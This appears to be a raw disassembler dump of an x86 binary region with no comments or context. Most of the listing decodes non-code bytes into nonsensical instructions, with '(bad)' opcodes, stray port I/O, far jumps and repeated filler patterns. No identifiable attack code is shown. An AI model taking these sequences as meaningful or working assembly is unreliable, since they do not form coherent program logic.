  41457f:	aas    
  414580:	das    
  414581:	sbb    DWORD PTR [ebx],0xeac3fe
	...
  41459b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41459c:	inc    ebx
  41459d:	inc    edx
  41459e:	push   0xffffff99
  4145a0:	adc    bh,BYTE PTR [ebx-0x1c]
  4145a3:	and    al,0x3b
  4145a5:	add    ah,bl
  4145a7:	pop    esi
  4145a8:	push   esp
  4145a9:	push   esi
  4145aa:	push   ecx
  4145ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145ac:	(bad)  
  4145ad:	std    
  4145ae:	push   esi
  4145af:	and    BYTE PTR [ecx-0x35bb088],ah
  4145b5:	add    BYTE PTR [ecx-0x58],ch
  4145b8:	add    dh,BYTE PTR [ebx-0x7a]
  4145bb:	sub    BYTE PTR [ecx-0x35bc888],bh
  4145c1:	add    BYTE PTR [esi+eax*1-0x5a967c77],dh
  4145c8:	cld    
  4145c9:	std    
  4145ca:	mov    ecx,0xe900a54c
  4145cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145d0:	pop    edi
  4145d1:	pop    esi
  4145d2:	mov    dl,0x23
  4145d4:	out    dx,al
  4145d5:	pop    ebx
  4145d6:	sub    ebx,DWORD PTR [ebx+0x7d975102]
  4145dc:	mov    eax,DWORD PTR [ebp+ecx*8-0x4c]
  4145e0:	mov    DWORD PTR fs:[ebp+0x6c6616c8],ecx
  4145e7:	jmp    0xeeb14f5c
  4145ec:	mov    BYTE PTR [eax-0x7],bh
  4145ef:	mov    ?,WORD PTR [eax+0xa01e8ff]
  4145f5:	mov    eax,DWORD PTR [eax]
  4145f7:	scas   al,BYTE PTR es:[edi]
  4145f8:	push   ss
  4145f9:	test   edi,eax
  4145fb:	push   0xfd237
	...
  414614:	pop    ecx
  414615:	xlat   BYTE PTR ds:[ebx]
  414616:	push   edx
  414617:	cmp    esi,0x8
  41461a:	push   eax
  41461b:	call   0x3d3e5a
  414620:	xchg   esi,eax
  414621:	inc    edx
  414622:	dec    ecx
  414623:	inc    ecx
  414624:	into   
  414625:	call   0x633f64
  41462a:	push   cs
  41462b:	mov    bh,0x5
  41462d:	push   esp
  41462e:	push   ebx
  41462f:	call   0x3d3fd2
  414634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414635:	ret    0x4149
  414638:	jle    0x414622
  41463a:	es stc 
  41463c:	add    DWORD PTR [ecx],eax
  41463e:	push   cs
  41463f:	mov    bh,0xe5
  414641:	push   esp
  414642:	push   esi
  414643:	call   0x3d3f7a
  414648:	inc    ecx
  414649:	bound  edx,QWORD PTR [edi-0x3e]
  41464c:	jbe    0x41464e
  41464e:	dec    edi
  41464f:	mov    eax,DWORD PTR [edx+0x24]
  414652:	or     BYTE PTR [ebx-0x1a],dl
  414655:	or     al,0xf5
  414657:	inc    DWORD PTR [ecx+0x3e80bf86]
  41465d:	add    BYTE PTR [eax],al
  41465f:	mov    eax,0x3d5362
  414664:	lds    ecx,FWORD PTR [edi]
  414666:	test   DWORD PTR [ebx],edx
  414668:	mov    ebp,0x7d8304bf
  41466d:	add    edi,DWORD PTR [ecx]
  41466f:	mov    esp,0x72004753
  414674:	mov    eax,ds:0x4dbcb7
	...
  41468d:	aas    
  41468e:	add    BYTE PTR [edi+0x7f159710],al
  414694:	ror    BYTE PTR [edx],0x87
  414697:	mov    edi,0x4016a704
  41469c:	dec    esi
  41469d:	jmpw   0x3414
  4146a1:	dec    esp
  4146a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146a3:	or     BYTE PTR [eax],al
  4146a5:	je     0x414717
  4146a7:	pusha  
  4146a8:	and    al,0xaf
  4146aa:	sbb    ah,ch
  4146ac:	call   0x8040f380
  4146b1:	in     al,0x69
  4146b3:	add    al,0x0
  4146b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146b6:	popa   
  4146b7:	inc    eax
  4146b8:	dec    ebx
  4146b9:	jmpw   0x5849
  4146bd:	push   ds
  4146be:	cli    
  4146bf:	test   cl,al
  4146c1:	mov    ds:0xe204c468,eax
  4146c6:	cmp    eax,0xf7a73f4d
  4146cb:	lock mov eax,0x411e53
  4146d1:	sbb    al,0xf8
  4146d3:	mov    dl,BYTE PTR [eax]
  4146d5:	and    al,0x28
  4146d7:	or     BYTE PTR [ecx+0x3c3eed67],al
  4146dd:	loope  0x414689
  4146df:	add    DWORD PTR [edx+0x78],esi
  4146e2:	mov    al,ds:0x96a704c3
  4146e7:	mov    ah,bl
  4146e9:	and    al,0x45
  4146eb:	sbb    al,0x51
  4146ed:	stc    
  4146ee:	pusha  
  4146ef:	pop    ebp
  4146f0:	or     BYTE PTR [eax],al
	...
  414706:	sbb    al,0x9e
  414708:	or     eax,0x5421ea8b
  41470d:	push   ecx
  41470e:	dec    edi
  41470f:	push   es
  414710:	cld    
  414711:	std    
  414712:	xor    BYTE PTR [esi+0x45],bl
  414715:	lock xlat BYTE PTR ds:[ebx]
  414717:	jbe    0x41475c
  414719:	or     BYTE PTR [edi+0x11],dh
  41471c:	in     al,0xf8
  41471e:	sbb    ah,dh
  414720:	mov    es,WORD PTR [ebx-0x1]
  414723:	cwde   
  414724:	test   cl,al
  414726:	mov    bh,0x2
  414728:	cmp    ch,ah
  41472a:	(bad)  
  41472b:	stc    
  41472c:	fiadd  WORD PTR [eax]
  41472e:	mov    ?,WORD PTR [esi-0x7258bcdd]
  414734:	and    al,0xfc
  414736:	push   edi
  414737:	jmp    0xc04f:0xfae2fb44
  41473e:	imul   eax,DWORD PTR [ecx-0x19],0xffffff8e
  414742:	fs repnz pop ss
  414745:	in     al,dx
  414746:	cmp    bh,cl
  414748:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414749:	add    BYTE PTR [esi-0x42],cl
  41474c:	sub    eax,DWORD PTR [ebx-0x59]
  41474f:	lea    ebp,[esp+ebp*8]
  414752:	push   edi
  414753:	jmp    0x5e72:0xfaaafb08
  41475a:	mov    ds:0x20f4248e,eax
  41475f:	inc    eax
  414760:	jae    0x4146ec
  414762:	in     al,dx
  414763:	repnz bound ebx,QWORD PTR [esi-0x6d]
  414767:	mov    gs,WORD PTR [ebx+ebp*8+0x0]
	...
  41477e:	add    BYTE PTR [eax],ch
  414780:	inc    eax
  414781:	push   ebx
  414782:	mov    bl,ah
  414784:	jmp    0x8ee7:0x43dc3fbf
  41478b:	in     al,0xfa
  41478d:	xchg   edi,eax
  41478e:	jmp    0x41472e
  414790:	sti    
  414791:	ds add dh,cl
  414794:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  414796:	inc    edx
  414797:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414798:	xchg   DWORD PTR [ebx+esi*8-0x52b1509],esp
  41479f:	inc    edx
  4147a0:	cli    
  4147a1:	(bad)  
  4147a2:	aas    
  4147a3:	in     al,dx
  4147a4:	inc    ebx
  4147a5:	out    0x8e,eax
  4147a7:	in     al,0xea
  4147a9:	mov    bh,0xeb
  4147ab:	mov    bh,bl
  4147ad:	push   es
  4147ae:	add    BYTE PTR ds:0x648bfb58,ch
  4147b4:	repnz add BYTE PTR [eax+0x69],ah
  4147b8:	test   BYTE PTR [edi+0x5b8c148c],0xdd
  4147bf:	sub    al,0x46
  4147c1:	call   0x882fb636
  4147c6:	xor    al,0x3
  4147c8:	imul   edi,DWORD PTR [esp+ebx*1+0x2c8b0262],0xffffffe3
  4147d0:	push   edx
  4147d1:	call   0xfe392396
  4147d6:	inc    ecx
  4147d7:	out    0x4d,eax
  4147d9:	aas    
  4147da:	jmp    0x3a318e16
  4147df:	shr    ebx,cl
  4147e1:	clc    
  4147e2:	sahf   
	...
  4147f7:	add    BYTE PTR [eax+0x6a24bc6a],bh
  4147fd:	add    cl,BYTE PTR [ebx-0x17ad44dc]
  414803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414804:	mov    ds:0x3617fdf7,eax
  414809:	inc    ebp
  41480a:	clc    
  41480b:	sbb    DWORD PTR [ebx-0x77910782],eax
  414811:	lea    eax,[esi-0xf]
  414814:	aam    0x8d
  414816:	inc    ebx
  414817:	pop    ecx
  414818:	shr    edx,cl
  41481a:	jne    0x41486d
  41481c:	jo     0x414815
  41481e:	and    DWORD PTR [edi],0xac8b5093
  414824:	dec    esp
  414825:	push   edx
  414826:	call   0xfe38a4fe
  41482b:	xchg   edi,eax
  41482c:	in     eax,dx
  41482d:	sub    esp,0xa668c
  414833:	mov    esp,0xd7fe533
  414838:	pop    ss
  414839:	stc    
  41483a:	std    
  41483b:	jmp    0x62969915
  414840:	(bad)  
  414841:	or     cl,BYTE PTR [ecx-0x76f65d00]
  414847:	test   DWORD PTR [esi+0x2efffbf8],ecx
  41484d:	in     eax,dx
  41484e:	push   esp
  41484f:	(bad)  
  414850:	stc    
  414851:	imul   DWORD PTR [edx+0x0]
  414854:	push   esi
  414855:	inc    edx
  414856:	dec    esi
  414857:	inc    ecx
  414858:	push   cs
  414859:	in     eax,dx
  41485a:	in     eax,0xfd
	...
  414870:	add    cl,bl
  414872:	imul   DWORD PTR ds:0x3c8384d2
  414878:	dec    esi
  414879:	(bad)  
  41487a:	inc    BYTE PTR [edi+0x7f42dc04]
  414880:	cli    
  414881:	idiv   BYTE PTR [eax-0x13]
  414884:	mov    DWORD PTR [ebx+0x7d],0xfe09fffe
  41488b:	(bad)  
  41488c:	dec    esi
  41488e:	jmp    0x4148e4
  414890:	mov    DWORD PTR [esi],ecx
  414892:	xchg   BYTE PTR [ecx-0x407e78c],al
  414898:	xor    DWORD PTR [ebp*8+0x70038b30],edi
  41489f:	(bad)  
  4148a0:	call   FWORD PTR [ecx]
  4148a2:	xchg   DWORD PTR [ecx-0x4070784],eax
  4148a8:	call   DWORD PTR [ebx]
  4148aa:	jo     0x4148aa
  4148ac:	(bad)  
  4148ad:	(bad)  [ecx+ecx*4-0x4072784]
  4148b4:	prefetchnta BYTE PTR ds:0x8d69e07f
  4148bb:	mov    ecx,0xfbf8987c
  4148c0:	(bad)  
  4148c2:	cmp    BYTE PTR ds:0xc5fec6f8,ch
  4148c8:	add    ecx,DWORD PTR [esi+0x45]
  4148cb:	inc    edx
  4148cc:	add    DWORD PTR [ebx+ebx*1+0x69a70579],0x3a
	...
  4148e8:	add    BYTE PTR [eax],al
  4148ea:	mov    dl,0x1f
  4148ec:	push   ebx
  4148ed:	push   esi
  4148ee:	jp     0x6d5a46ef
  4148f4:	test   al,0x78
  4148f6:	adc    ecx,esi
  4148f8:	sti    
  4148f9:	add    BYTE PTR [edi],ah
  4148fb:	mov    ch,0x1
  4148fd:	jae    0x414947
  4148ff:	ins    DWORD PTR es:[edi],dx
  414900:	mov    ebp,0xfbd8f978
  414905:	add    BYTE PTR [edx+0x6f],bh
  414908:	lea    eax,[ebx-0x20437d9]
  41490e:	ja     0x4148e1
  414910:	(bad)  
  414911:	sti    
  414912:	fdivr  DWORD PTR [eax+0x626c5e5b]
  414918:	lock pop ebx
  41491a:	in     eax,0xe1
  41491c:	add    DWORD PTR [ebx+0x2e],edx
  41491f:	xchg   DWORD PTR [eax+edx*2+0x54],edx
  414923:	das    
  414924:	xchg   DWORD PTR [ebx-0x61],edx
  414927:	fs pop ebp
  414929:	or     al,0x1c
  41492b:	unpcklps xmm5,XMMWORD PTR [edi]
  41492e:	outs   dx,BYTE PTR ds:[esi]
  41492f:	jae    0x414939
  414931:	comiss xmm3,DWORD PTR ds:0xe51df80d
  414938:	adc    cl,BYTE PTR [eax-0x7ebd2d5d]
  41493e:	jle    0x414931
  414940:	jge    0x41492d
  414942:	aam    0xbb
  414944:	jmp    0xfb91b6f5
  414949:	das    
  41494a:	push   ebp
  41494b:	push   esi
  41494c:	adc    BYTE PTR [edx],bl
	...
  414962:	add    BYTE PTR ds:0xa6322fe5,ch
  414968:	jno    0x41496b
  41496a:	inc    edx
  41496b:	and    al,0x33
  41496d:	or     al,0x7c
  41496f:	push   edi
  414970:	cli    
  414971:	iret   
  414972:	mov    ch,bl
  414974:	add    bh,ah
  414976:	sti    
  414977:	das    
  414978:	(bad)  
  414979:	fadd   DWORD PTR [ecx+0x26]
  41497c:	cld    
  41497d:	fistp  QWORD PTR [edi+0x36]
  414980:	pop    eax
  414981:	mov    dl,0x8a
  414983:	adc    edx,DWORD PTR [ebp+0x29]
  414986:	adc    BYTE PTR [edi-0x58fc18fe],ah
  41498c:	add    ah,bh
  41498e:	add    esp,DWORD PTR [edi-0x58fc18fe]
  414994:	add    ah,bh
  414996:	add    esp,DWORD PTR [edi-0x58fc18fe]
  41499c:	add    ah,bh
  41499e:	add    esp,DWORD PTR [edi-0x58fc18fe]
  4149a4:	add    ah,bh
  4149a6:	add    esp,DWORD PTR [edi-0x58fc18fe]
  4149ac:	add    ah,bh
  4149ae:	add    esp,DWORD PTR [edi-0x58fc18fe]
  4149b4:	add    ah,bh
  4149b6:	add    esp,DWORD PTR [edi-0x58fc18fe]
  4149bc:	add    ah,bh
  4149be:	add    esp,DWORD PTR [edi-0x58fc18fe]
  4149c4:	add    ah,bh
  4149c6:	add    eax,DWORD PTR [eax]
	...
  4149dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149dd:	add    ah,bh
  4149df:	add    esp,DWORD PTR [edi-0x58fc18fe]
  4149e5:	add    ah,bh
  4149e7:	add    esp,DWORD PTR [edi-0x58fc18fe]
  4149ed:	add    ah,bh
  4149ef:	add    esp,DWORD PTR [edi-0x58fc18fe]
  4149f5:	add    ah,bh
  4149f7:	add    esp,DWORD PTR [edi-0x58fc18fe]
  4149fd:	add    ah,bh
  4149ff:	add    esp,DWORD PTR [edi-0x5b16fffe]
  414a05:	add    al,BYTE PTR [eax]
  414a07:	jmp    0xe9414cb0
  414a0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a0d:	add    al,BYTE PTR [eax]
  414a0f:	jmp    0xe4414cb8
  414a14:	sahf   
  414a15:	or     DWORD PTR [edx],ecx
  414a17:	mov    BYTE PTR [esi+eax*2+0x67],dh
  414a1b:	mov    eax,esp
  414a1d:	ins    BYTE PTR es:[edi],dx
  414a1e:	das    
  414a1f:	iret   
  414a20:	aam    0x25
  414a22:	and    cl,cl
  414a24:	mov    ecx,0x8c752022
  414a29:	popa   
  414a2a:	and    BYTE PTR [edx-0x72],bl
  414a2d:	push   ebp
  414a2e:	ins    BYTE PTR es:[edi],dx
  414a2f:	dec    ebp
  414a30:	xchg   BYTE PTR [eax+0x20],dh
  414a33:	pop    ebp
  414a34:	jnp    0x414a97
  414a36:	and    BYTE PTR [ebx+0x46],cl
  414a39:	outs   dx,BYTE PTR ds:[esi]
  414a3a:	je     0x414a88
  414a3c:	push   ecx
  414a3d:	and    bh,BYTE PTR [edx]
  414a3f:	adc    BYTE PTR [eax],al
	...
  414a55:	sahf   
  414a56:	or     BYTE PTR [ecx+0x46],al
  414a59:	push   ebx
  414a5a:	ins    DWORD PTR es:[edi],dx
  414a5b:	jb     0x414a9d
  414a5d:	inc    esp
  414a5e:	push   0x74
  414a60:	leave  
  414a61:	mov    WORD PTR [ebx+0x27],fs
  414a64:	leave  
  414a65:	jnp    0x414a94
  414a67:	aaa    
  414a68:	sar    DWORD PTR [edi+0x30],1
  414a6b:	xor    cl,bl
  414a6d:	jecxz  0x414a91
  414a6f:	bound  eax,QWORD PTR [eax]
  414a71:	ret    
  414a72:	dec    eax
  414a73:	ins    DWORD PTR es:[edi],dx
  414a74:	add    al,0x19
  414a76:	pusha  
  414a77:	arpl   WORD PTR [edi],ax
  414a79:	ret    
  414a7a:	cmp    eax,0x6507fa62
  414a7f:	sub    al,0x9
  414a81:	loop   0x414ae9
  414a83:	ins    BYTE PTR es:[edi],dx
  414a84:	or     ecx,ebx
  414a86:	pop    ebp
  414a87:	gs sar eax,0x73
  414a8b:	and    BYTE PTR [ebx+0x6373c7],bh
  414a91:	sbb    al,0x73
  414a93:	popa   
  414a94:	mov    al,fs:0x440d0a0b
  414a9a:	dec    edx
  414a9b:	imul   esi,DWORD PTR [edx+0x6b],0x21
  414a9f:	outs   dx,BYTE PTR gs:[esi]
  414aa1:	sub    BYTE PTR [eax+0x72],ch
  414aa4:	ins    DWORD PTR es:[edi],dx
  414aa5:	pop    ds
  414aa6:	gs outs dx,DWORD PTR gs:[esi]
  414aa9:	and    BYTE PTR [edi],dh
  414aab:	and    BYTE PTR [eax+0x3a],ch
  414aae:	gs jo  0x414aeb
  414ab1:	icebp  
  414ab2:	daa    
  414ab3:	jae    0x414b2c
  414ab5:	cdq    
  414ab6:	sub    esp,DWORD PTR [ebp+0x62]
	...
  414acd:	add    BYTE PTR [ebp-0x7e8c919e],cl
  414ad3:	arpl   WORD PTR [edi+esi*2+0x6f],si
  414ad7:	ins    BYTE PTR es:[edi],dx
  414ad8:	popa   
  414ad9:	cs pop ebp
  414adb:	imul   ebp,DWORD PTR [ecx+0x2f],0xa090703
  414ae2:	into   
  414ae3:	add    BYTE PTR [eax],al
  414ae5:	add    dh,cl
  414ae7:	add    BYTE PTR [eax],al
  414ae9:	add    BYTE PTR [esi-0x42000000],bh
  414aef:	add    BYTE PTR [eax],al
  414af1:	add    dh,cl
  414af3:	add    BYTE PTR [eax],al
  414af5:	add    dh,cl
  414af7:	add    BYTE PTR [eax],al
  414af9:	add    BYTE PTR [esi-0x42000000],bh
  414aff:	add    BYTE PTR [eax],al
  414b01:	add    BYTE PTR [esi-0x72000000],cl
  414b07:	add    BYTE PTR [eax],al
  414b09:	add    BYTE PTR [esi+0x0],bh
  414b0c:	add    BYTE PTR [eax],al
  414b0e:	jle    0x414b10
  414b10:	add    BYTE PTR [eax],al
  414b12:	mov    es,WORD PTR [eax]
  414b14:	add    BYTE PTR [eax],al
  414b16:	mov    es,WORD PTR [eax]
  414b18:	add    BYTE PTR [eax],al
  414b1a:	jle    0x414b1c
  414b1c:	add    BYTE PTR [eax],al
  414b1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b1f:	mov    ?,WORD PTR [edx+0x202acc4e]
  414b25:	sub    esp,DWORD PTR [ebx+0x4354cf33]
  414b2b:	pop    ss
  414b2c:	mov    ds:0x80bc7a62,eax
  414b31:	or     DWORD PTR [eax],eax
	...
  414b47:	fdiv   st,st(6)
  414b49:	or     ecx,DWORD PTR [eax]
  414b4b:	xchg   esi,eax
  414b4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b4d:	or     ch,BYTE PTR [eax+0x4b]
  414b50:	mov    dl,0x7b
  414b52:	push   ecx
  414b53:	sbb    edx,ebp
  414b55:	add    DWORD PTR [eax],eax
  414b57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b58:	jmp    0xe9e84b5e
  414b5d:	add    DWORD PTR [eax],eax
  414b5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b60:	jmp    0xe9e84b66
  414b65:	add    DWORD PTR [eax],eax
  414b67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b68:	jmp    0xe9e84b6e
  414b6d:	add    DWORD PTR [eax],eax
  414b6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b70:	jmp    0xe9e84b76
  414b75:	add    DWORD PTR [eax],eax
  414b77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b78:	jmp    0xe9e84b7e
  414b7d:	add    DWORD PTR [eax],eax
  414b7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b80:	jmp    0xe9e84b86
  414b85:	add    DWORD PTR [eax],eax
  414b87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b88:	jmp    0xe9e84b8e
  414b8d:	add    DWORD PTR [eax],eax
  414b8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b90:	jmp    0xe9e84b96
  414b95:	add    DWORD PTR [eax],eax
  414b97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b98:	jmp    0xe9e84b9e
  414b9d:	add    DWORD PTR [eax],eax
  414b9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ba0:	jmp    0xe9e84ba6
  414ba5:	add    DWORD PTR [eax],eax
  414ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ba8:	jmp    0x414bae
	...
  414bbd:	add    BYTE PTR [eax],al
  414bbf:	add    BYTE PTR [edi-0x58fc18fe],ah
  414bc5:	add    ah,bh
  414bc7:	add    esp,DWORD PTR [edi-0x58fc18fe]
  414bcd:	add    ah,bh
  414bcf:	add    esp,DWORD PTR [edi-0x58fc18fe]
  414bd5:	add    ah,bh
  414bd7:	add    esp,DWORD PTR [edi-0x58fc18fe]
  414bdd:	add    ah,bh
  414bdf:	add    esp,DWORD PTR [edi-0x58fc18fe]
  414be5:	add    ah,bh
  414be7:	add    esp,DWORD PTR [edi-0x58fc18fe]
  414bed:	add    ah,bh
  414bef:	add    esp,DWORD PTR [edi-0x58fc18fe]
  414bf5:	add    ah,bh
  414bf7:	add    esp,DWORD PTR [edi-0x58fc18fe]
  414bfd:	add    ah,bh
  414bff:	add    esp,DWORD PTR [edi-0x58fc18fe]
  414c05:	add    ah,bh
  414c07:	add    esp,DWORD PTR [edi-0x58fc18fe]
  414c0d:	add    ah,bh
  414c0f:	add    esp,DWORD PTR [edi-0x58fc18fe]
  414c15:	add    ah,bh
  414c17:	add    esp,DWORD PTR [edi-0x58fc18fe]
  414c1d:	add    ah,bh
  414c1f:	add    esp,DWORD PTR [edi+0x3e702]
	...
  414c39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c3a:	add    ah,bh
  414c3c:	add    esp,DWORD PTR [edi-0x58fc18fe]
  414c42:	add    ah,bh
  414c44:	add    esp,DWORD PTR [edi-0x58fc18fe]
  414c4a:	add    ah,bh
  414c4c:	add    esp,DWORD PTR [edi-0x5b16fffe]
  414c52:	add    al,BYTE PTR [eax]
  414c54:	jmp    0xe9414efd
  414c59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c5a:	add    al,BYTE PTR [eax]
  414c5c:	jmp    0xe9414f05
  414c61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c62:	add    al,BYTE PTR [eax]
  414c64:	jmp    0xe9414f0d
  414c69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c6a:	add    al,BYTE PTR [eax]
  414c6c:	jmp    0xe9414f15
  414c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c72:	add    al,BYTE PTR [eax]
  414c74:	jmp    0xe9414f1d
  414c79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c7a:	add    al,BYTE PTR [eax]
  414c7c:	jmp    0xd8414f25
  414c81:	fidiv  DWORD PTR [ebx]
  414c83:	xor    al,0xd4
  414c85:	(bad)  
  414c86:	add    dh,BYTE PTR [eax-0x78]
  414c89:	fwait
  414c8a:	jae    0x414d01
  414c8c:	mov    ss,WORD PTR [edx-0x7386ff9a]
  414c92:	jb     0x414cf6
  414c94:	mov    esp,DWORD PTR [ecx+eiz*2+0x76754c75]
  414c9b:	ja     0x414c86
	...
  414cb1:	add    BYTE PTR [ebx-0x69e2cecc],dh
  414cb7:	add    ch,BYTE PTR [edx+0x44]
  414cba:	push   esp
  414cbb:	jne    0x414d2e
  414cbd:	jmp    0xf572815d
  414cc2:	xchg   edi,eax
  414cc3:	cmp    BYTE PTR ds:0x3221a4f1,dh
  414cc9:	cli    
  414cca:	mov    BYTE PTR [edx],al
  414ccc:	pop    edi
  414ccd:	or     eax,DWORD PTR [ecx+eiz*1+0x32]
  414cd1:	fisub  DWORD PTR [esi+ebx*2+0x660e1d63]
  414cd8:	jmp    DWORD PTR [si+0x6376]
  414cdd:	add    BYTE PTR [ebp-0x6693ff9f],cl
  414ce3:	pusha  
  414ce4:	popa   
  414ce5:	add    BYTE PTR [edi],bh
  414ce7:	xor    ebp,DWORD PTR [edi]
  414ce9:	add    BYTE PTR [esi+0x66],bh
  414cec:	outs   dx,DWORD PTR ds:[esi]
  414ced:	jae    0x414d40
  414cef:	push   0x68f6472
  414cf4:	push   0x6b696a65
  414cf9:	add    BYTE PTR [ebx],bl
  414cfb:	push   0x6e636b6e
  414d00:	add    BYTE PTR [esp+ecx*1+0x66],ah
  414d04:	arpl   WORD PTR [edi+0x68],bp
  414d07:	add    eax,0x73f37274
  414d0c:	je     0x414d7c
  414d0e:	sbb    DWORD PTR [esi],esi
  414d10:	add    BYTE PTR [ecx],dh
  414d12:	dec    edi
  414d13:	ss sub eax,0x31
	...
  414d29:	add    BYTE PTR [eax],al
  414d2b:	inc    DWORD PTR [eiz*2+0x615f996c]
  414d32:	jns    0x414d6d
  414d34:	jb     0x414d36
  414d36:	xor    DWORD PTR [esp+esi*1+0x34],ecx
  414d3a:	xor    eax,0x73002040
  414d3f:	es outs dx,WORD PTR fs:[esi]
  414d43:	push   ecx
  414d44:	push   es
  414d45:	sub    eax,0x31328d32
  414d4a:	shr    DWORD PTR ss:[esi],0x35
  414d4e:	add    BYTE PTR [ebp+0x5e],ch
  414d51:	jb     0x414dbc
  414d53:	lea    esi,[edx+0x0]
  414d56:	jae    0x414ceb
  414d58:	push   0x6867686f
  414d5d:	popa   
  414d5e:	add    BYTE PTR [ebx+0x67],bh
  414d61:	outs   dx,DWORD PTR ds:[esi]
  414d62:	je     0x414d07
  414d64:	je     0x414d66
  414d66:	arpl   WORD PTR [ecx-0x588a8fa5],bx
  414d6c:	or     eax,0x9a7725f
  414d71:	jb     0x414dda
  414d73:	add    ebp,edi
  414d75:	pop    esi
  414d76:	jno    0x414d8c
  414d78:	fisubr DWORD PTR [ebp+0x67]
  414d7b:	or     BYTE PTR [ecx],al
  414d7d:	pop    edi
  414d7e:	jb     0x414d27
  414d80:	pop    es
  414d81:	gs ins DWORD PTR es:[edi],dx
  414d83:	sti    
  414d84:	mov    ebx,0xd9fb6c64
  414d89:	outs   dx,BYTE PTR fs:[esi]
  414d8b:	enter  0x65be,0x0
	...
  414da3:	add    ch,cl
  414da5:	(bad)  
  414da6:	jb     0x414e1b
  414da8:	aam    0xea
  414daa:	add    DWORD PTR [edi],ebp
  414dac:	xchg   ebp,eax
  414dad:	in     al,dx
  414dae:	xor    al,0x32
  414db0:	je     0x414d8b
  414db2:	outs   dx,BYTE PTR ds:[esi]
  414db3:	push   0x7660b5c6
  414db8:	retf   0x18b
  414dbb:	data16 mov ch,0x86
  414dbe:	pusha  
  414dbf:	fs nop
  414dc1:	xchg   BYTE PTR [ecx],al
  414dc3:	imul   ecx,DWORD PTR [esi-0x6a9c9a93],0x837164d9
  414dcd:	xchg   DWORD PTR [ecx],eax
  414dcf:	jno    0x414d61
  414dd1:	jl     0x414e35
  414dd3:	arpl   WORD PTR [ebp-0x27],si
  414dd6:	jb     0x414e4b
  414dd8:	ja     0x414e18
  414dda:	jb     0x414e47
  414ddc:	xchg   BYTE PTR [edi],bh
  414dde:	add    al,0x6b
  414de0:	dec    esi
  414de1:	cmp    al,0x6c
  414de3:	pop    edi
  414de4:	inc    edx
  414de5:	sub    eax,0x3e3f6104
  414dea:	pop    ebp
  414deb:	jno    0x414e2f
  414ded:	fldcw  WORD PTR [edx+0x6e]
  414df0:	cmp    edi,DWORD PTR [esi]
  414df2:	jb     0x414e62
  414df4:	inc    edx
  414df5:	xor    eax,0x2406a04
  414dfa:	sbb    ch,BYTE PTR [esp+esi*1+0x61]
  414dfe:	out    0x5d,eax
  414e00:	adc    al,0x64
  414e02:	add    bh,BYTE PTR [ebx+0xa]
  414e05:	jbe    0x414dee
  414e07:	popa   
	...
  414e1c:	add    BYTE PTR [ebx],al
  414e1e:	data16 cli 
  414e20:	jo     0x414e26
  414e22:	addr16 out 0x61,eax
  414e25:	loopne 0x414e9a
  414e27:	or     al,0x62
  414e29:	fcomp  DWORD PTR [esi-0x5]
  414e2c:	add    esi,esi
  414e2e:	jbe    0x414df8
  414e30:	jno    0x414e24
  414e32:	popa   
  414e33:	fnstenv [eax-0x59]
  414e36:	xor    dl,BYTE PTR [edi]
  414e38:	xor    al,0x97
  414e3a:	xor    dl,BYTE PTR [edi]
  414e3c:	add    al,0xd7
  414e3e:	jne    0x414df9
  414e40:	jae    0x414dfd
  414e42:	gs out 0x69,eax
  414e45:	shl    BYTE PTR [ebx+ecx*8+0x62],cl
  414e49:	leave  
  414e4a:	add    al,ch
  414e4c:	(bad)  
  414e4d:	enter  0x8f76,0x3
  414e51:	mov    dh,0x75
  414e53:	mov    WORD PTR [esi-0x7c],fs
  414e56:	je     0x414e3f
  414e58:	bound  edx,QWORD PTR [esi-0x67a184a6]
  414e5e:	add    cl,BYTE PTR [ecx-0x7b896992]
  414e64:	jno    0x414e0d
  414e66:	pop    edx
  414e67:	mov    WORD PTR [edx+0x71],fs
  414e6a:	gs jge 0x414e70
  414e6d:	ja     0x414ed4
  414e6f:	push   edi
  414e70:	je     0x414df6
  414e72:	je     0x414e5b
  414e74:	sub    al,0x9a
  414e76:	aaa    
  414e77:	push   ds
  414e78:	sub    eax,0x6be73792
  414e7d:	push   esp
  414e7e:	pusha  
  414e7f:	cmp    ebx,DWORD PTR [edi+0x0]
	...
  414e96:	push   ebp
  414e97:	add    cl,BYTE PTR [ebx+0x65]
  414e9a:	cmp    DWORD PTR [ebp+0x0],esp
  414e9d:	inc    ebp
  414e9e:	cmp    al,0x2
  414ea0:	pop    edi
  414ea1:	aas    
  414ea2:	inc    edi
  414ea3:	je     0x414f08
  414ea5:	push   ds
  414ea6:	mov    ds:0x80e6876,eax
  414eab:	dec    esi
  414eac:	jno    0x414e97
